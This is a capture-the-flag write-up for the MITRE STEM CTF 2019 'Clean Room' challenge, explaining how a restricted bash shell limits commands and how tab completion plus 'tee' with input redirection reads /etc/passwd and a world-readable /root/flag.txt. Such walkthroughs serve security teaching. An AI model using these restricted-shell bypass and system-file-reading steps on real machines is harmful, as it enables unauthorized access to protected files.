---
layout: single
title: "MITRE STEM CTF Cyber Challenge 2019 - Clean Room (Linux 50pts)"
date: 2019-02-24
---
Description:

>The year is 30xx. Clyde is trapped in an interdimensional transport module. The Federation has captured the module and has prepared to dock. The captain of the Federation lander has instructed the henchmen to bring Clyde in to Federation custody. As a precaution they will place Clyde in a clean room to remove any radiation. Luckily, you’ve hacked into the lander’s mainframe. Help Clyde escape!

>ssh ctf@138.247.13.108


```
ctf@e94f4dd9664a:~$ ls
-rbash: ls: command not found
```
## What the rbash?!

From the [bash manual](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html).

> If Bash is started with the name rbash, or the --restricted or -r option is supplied at invocation, the shell becomes restricted. A restricted shell is used to set up an environment more controlled than the standard shell. A restricted shell behaves identically to bash with the exception that the following are disallowed or not performed:

> * Changing directories with the cd builtin.
> * Setting or unsetting the values of the SHELL, PATH, ENV, or BASH_ENV variables.
> * Specifying command names containing slashes.
> * Specifying a filename containing a slash as an argument to the . builtin command.
> * Specifying a filename containing a slash as an argument to the -p option to the hash builtin command.
> * Importing function definitions from the shell environment at startup.
> * Parsing the value of SHELLOPTS from the shell environment at startup.
> * Redirecting output using the ‘\>’, ‘\>\|’, ‘\<\>’, ‘\>&’, ‘&\>’, and ‘\>\>’ redirection operators.
> * Using the exec builtin to replace the shell with another command.
> * Adding or deleting builtin commands with the -f and -d options to the enable builtin.
> * Using the enable builtin command to enable disabled shell builtins.
> * Specifying the -p option to the command builtin.
> * Turning off restricted mode with ‘set +r’ or ‘set +o restricted’.



So now that we know what we can't do, what can we do? We can use bash's command completion (tab) in order to enumerate a list of functions and commands available.
```bash
ctf@e94f4dd9664a:~$
!          break      coproc     enable     fi         jobs       popd       shift      true       {
./         builtin    declare    esac       for        kill       printf     shopt      type       }
:          caller     dirs       eval       function   l          pushd      source     typeset
[          case       disown     exec       getopts    la         pwd        suspend    ulimit
[[         cd         do         exit       grep       let        read       tee        umask
]]         command    done       export     hash       ll         readarray  test       unalias
alert      compgen    echo       false      help       local      readonly   then       unset
alias      complete   egrep      fc         history    logout     return     time       until
bg         compopt    elif       fg         if         ls         select     times      wait
bind       continue   else       fgrep      in         mapfile    set        trap       while
```

The command: [tee(1)](http://man7.org/linux/man-pages/man1/tee.1.html) immediately stood out as it is not a builtin command and can be used to enumerate directory contents and read files. Using tee and shell completion, we can list the files in a directory.

```bash
ctf@e94f4dd9664a:~$ tee
.bash_logout  .bashrc       .profile      bin/
```

We can also use a combination of tee and shell input redirection to read the contents of any file that we have access to
```bash
ctf@e94f4dd9664a:~$ tee < /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ctf:x:1000:1000::/home/ctf:/bin/rbash
```


We enumerated many directories looking for anything that stood out.
```
ctf@e94f4dd9664a:~$ tee < /
.dockerenv  dev/        lib/        mnt/        root/       srv/        usr/
bin/        etc/        lib64/      opt/        run/        sys/        var/
boot/       home/       media/      proc/       sbin/       tmp/
```

It turned out that root's home directory was world readable and contained a file, flag.txt which contained as it's name suggests... the flag.
```bash
ctf@e94f4dd9664a:~$ tee < /root/
.bashrc   .profile  flag.txt

ctf@e94f4dd9664a:~$ tee < /root/flag.txt
MCA{ieHaisoh4eif2ae}
```
